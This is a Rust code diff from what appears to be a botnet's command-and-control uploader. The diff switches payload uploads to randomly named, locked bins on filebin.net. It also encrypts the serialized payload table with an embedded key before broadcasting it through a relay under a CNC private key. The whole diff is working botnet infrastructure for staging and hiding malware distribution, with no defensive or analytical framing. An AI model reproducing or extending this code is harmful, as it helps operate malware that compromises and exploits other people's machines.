@@ -21,15 +21,24 @@ const PAYLOAD: &'static str = "payload";
 
 // Filedump constants
 const FILEDUMP: &'static str = "https://filebin.net";
-const BIN: &'static str = "bns-botenet-payload";
 
 const RELAYS: [&str; 1] = [bns_lib::RELAY];
+
+async fn generate_bin() -> String {
+    rand::distributions::DistString::sample_string(
+        &rand::distributions::Alphanumeric,
+        &mut rand::thread_rng(),
+        8,
+    )
+}
 
 async fn upload_payload(
     client: &RClient,
     architecture: &str,
     data: Bytes,
 ) -> Result<response::FilebinResponse, ()> {
+    let bin = generate_bin().await;
+
     let mut headers = HeaderMap::new();
     headers.insert("accept", HeaderValue::from_static("application/json"));
     headers.insert("cid", HeaderValue::from_static("botnetclient")); // Id isn't important i guess
@@ -39,8 +48,9 @@ async fn upload_payload(
     );
 
     let filename = format!("payload-{}", architecture);
-    let url = format!("{}/{}/{}", FILEDUMP, BIN, filename);
+    let url = format!("{}/{}/{}", FILEDUMP, bin, filename);
 
+    // Upload file
     let response = client
         .post(url)
         .headers(headers)
@@ -51,6 +61,10 @@ async fn upload_payload(
         .json::<response::FilebinResponse>()
         .await
         .map_err(|_| ())?;
+
+    // lock bin
+    let url = format!("{}/{}", FILEDUMP, bin);
+    let _ = client.put(url).send().await.map_err(|_| ())?;
 
     Ok(response)
 }
@@ -114,6 +128,9 @@ async fn run() -> Result<()> {
     println!("[+] Created serialized table");
     println!("{:?}", serialized);
 
+    let encrypted = bns_lib::encryption::encrypt(&serialized, bns_lib::ENCRYPTION_KEY)
+        .expect("failed to encrypt payload");
+
     let keys: Keys = Keys::parse(bns_lib::CNC_PRIVATE_KEY)?;
 
     let connection: Connection = Connection::new();
@@ -132,7 +149,7 @@ async fn run() -> Result<()> {
         .expect("failed to connect to relay");
 
     println!("[+] uploading data...");
-    let builder = EventBuilder::text_note(serialized);
+    let builder = EventBuilder::text_note(encrypted);
     client.send_event_builder(builder).await.unwrap();
 
     client.disconnect().await;
